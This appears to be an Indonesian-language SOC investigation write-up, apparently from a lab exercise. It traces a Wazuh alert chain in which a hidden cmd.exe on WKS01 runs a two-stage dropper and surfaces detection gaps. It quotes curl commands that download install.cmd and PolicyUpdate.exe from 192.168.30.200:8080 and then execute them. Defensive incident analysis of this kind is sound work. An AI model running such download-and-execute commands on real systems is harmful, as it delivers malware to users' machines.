# 02 - Investigation

## Menelusuri Execution Chain

Dari triage, saya punya starting point: `cmd.exe` menjalankan `curl` untuk download file dari `192.168.30.200:8080`. Tapi pertanyaan besarnya — siapa yang trigger `cmd.exe` ini?

### Mencari Parent Process

Saya coba filter alert 92052 (Windows command prompt started by an abnormal process) di time range yang sama. Ada 5 hit dari WKS01, tapi setelah saya buka satu per satu, **semua ternyata `dsregcmd.exe` yang di-spawn oleh `svchost.exe` (SYSTEM)**. Ini aktivitas Windows normal — Azure AD registration check yang dijadwalkan.

Tidak ada satupun alert 92052 yang menunjukkan `cmd.exe` di-spawn oleh `explorer.exe` atau proses user lainnya.

Saya juga coba filter `data.win.eventdata.parentImage:*explorer*` untuk WKS01 — **0 hit**. Wazuh sama sekali tidak punya alert untuk event `explorer.exe` meluncurkan `cmd.exe`.

Ini berarti ada gap: **initial trigger — bagaimana cmd.exe pertama kali dijalankan — tidak tercatat sebagai alert di Wazuh**. Investigator hanya bisa menyimpulkan dari konteks bahwa kemungkinan besar userBeta mengklik sesuatu (file, shortcut, atau link) yang memicu `cmd.exe` secara hidden.

### Analisis File yang Didownload

#### install.cmd

Dari alert 92005 di 16:35:28.188, `parentCommandLine` menunjukkan:

```
cmd.exe /c curl -s http://192.168.30.200:8080/install.cmd -o C:\Users\userBeta\AppData\Local\Temp\i.cmd && C:\Users\userBeta\AppData\Local\Temp\i.cmd
```

Pola ini menunjukkan: download `install.cmd`, simpan sebagai `i.cmd` di TEMP, langsung execute. Flag `-s` pada curl berarti silent mode — tidak ada output ke console. Ini sengaja supaya user tidak melihat apa-apa.

#### PolicyUpdate.exe

Alert 92074 di 16:35:29.229 menunjukkan bahwa `i.cmd` (yang baru didownload) ternyata menjalankan curl lagi:

```
curl -s http://192.168.30.200:8080/PolicyUpdate.exe -o C:\Users\userBeta\AppData\Local\Temp\PolicyUpdate.exe
```

Jadi `install.cmd` adalah **dropper script** — tugasnya cuma download payload utama (`PolicyUpdate.exe`) dan menjalankannya. Two-stage delivery: LNK → cmd → install.cmd → PolicyUpdate.exe.

Nama `PolicyUpdate.exe` terlihat seperti software update yang sah. Ini teknik social engineering di level filename.

### Cluster Alert yang Berulang

Yang menarik, pattern alert yang sama (92005 → 92213 → 92074 → 92032) muncul **tiga kali** dalam waktu berdekatan:

| Cluster | Waktu Awal | Kemungkinan Trigger |
|---|---|---|
| 1 | 16:35:28 | Execution pertama — userBeta klik file |
| 2 | 16:35:54 | Kemungkinan scheduled task test atau re-execution |
| 3 | 16:36:26 | Execution ketiga |

Cluster 2 dan 3 punya pola identik dengan cluster 1. Ini menunjukkan command yang sama dijalankan beberapa kali — bisa jadi attacker sedang testing persistence mechanism, atau ada trigger otomatis yang sudah dipasang.

### Network Indicator

IP `192.168.30.200` muncul berulang kali di command line:
- Port 8080 — HTTP server untuk serve file (`install.cmd`, `PolicyUpdate.exe`)
- Ini IP internal di subnet 192.168.30.0/24

Saya tidak menemukan alert untuk outbound connection dari WKS01 ke port lain di IP ini. Tapi kalau `PolicyUpdate.exe` adalah reverse shell atau C2 agent, kemungkinan ada connection ke port lain (4444, 443, dll) yang tidak ter-log oleh Wazuh. Sysmon Event ID 3 (Network Connection) perlu dicek di host langsung kalau masih tersedia.

### Mencari Persistence

Alert 92217 di 16:43:48.112 menunjukkan "Executable dropped in Windows root folder" — ini datang beberapa menit setelah initial execution. Kemungkinan attacker sudah di dalam system dan sedang menyiapkan persistence.

Saya cari alert terkait Scheduled Task creation (Event ID 4698) — **0 hit**. Wazuh tidak punya rule yang surface Event ID 4698 ke level alert yang cukup. Ini gap yang signifikan.

Saya juga cari alert yang mengandung keyword "ScheduledTask" — tidak ada. Artinya kalau attacker membuat scheduled task, kita **tidak akan tahu dari Wazuh saja**.

Tanpa akses langsung ke WKS01 untuk query Task Scheduler, saya tidak bisa mengonfirmasi apakah persistence sudah dipasang. Tapi dari pattern cluster alert yang berulang (execution yang sama terjadi 3 kali), ada indikasi kuat bahwa **mekanisme persistence sudah aktif** dan sedang men-trigger download-execute chain yang sama setiap kali.

### Pemeriksaan Alert Tambahan

#### Alert 67028 — Special privileges assigned to new logon
**Timestamp:** 16:47:38.796

Event ID 4672 — privilege assignment saat logon baru. Ini bisa normal (admin logon), tapi timing-nya setelah rangkaian alert suspicious perlu dicatat. Kemungkinan ini terkait session baru yang dibuat oleh proses yang sudah compromised.

#### Alert 92307 — Evidence of new service creation
**Timestamp:** 16:35:16.xxx (beberapa hit)

Event ID 13 (Sysmon Registry Value Set) — ada modifikasi registry di `HKLM\S...`. Ini muncul tepat sebelum cluster alert pertama. Bisa jadi terkait, bisa jadi tidak — perlu korelasi lebih lanjut.

## Kesimpulan Investigasi

Berdasarkan evidence yang tersedia:

1. **userBeta di WKS01 mengklik sesuatu** yang memicu `cmd.exe` secara hidden — kemungkinan file shortcut (.lnk) yang menyamar sebagai dokumen
2. `cmd.exe` menjalankan **two-stage payload delivery**: download `install.cmd` → execute → download `PolicyUpdate.exe`
3. Semua file didownload dari **192.168.30.200:8080** menggunakan `curl.exe` (Windows built-in)
4. `PolicyUpdate.exe` di-drop ke folder TEMP userBeta — folder yang biasa dipakai malware
5. Pattern execution yang sama terjadi **3 kali**, mengindikasikan ada **persistence mechanism** yang aktif
6. **Initial trigger dan persistence mechanism tidak terdeteksi** oleh Wazuh — ini detection gap yang serius
